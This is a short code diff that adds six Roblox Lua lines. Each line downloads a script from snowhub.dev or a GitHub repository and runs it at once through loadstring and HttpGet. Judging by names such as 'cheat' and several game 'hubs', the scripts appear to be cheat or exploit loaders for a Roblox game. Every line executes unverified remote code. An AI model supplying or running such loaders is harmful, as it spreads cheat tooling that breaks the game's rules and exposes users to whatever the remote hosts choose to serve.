@@ -1,0 +1,6 @@
+loadstring(game:HttpGet("https://snowhub.dev/script.lua", true))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Deni210/BABFT/main/Ruby%20Hub", true))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BoaHacker/ROBLOX/main/cheat", true))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Vynixius/main/Loader.lua"))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/1201for/V.G-Hub/main/V.Ghub"))();
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/JustAP1ayer/BABFTPLAYERHUB/main/MainBABFTHub.lua"),true))();
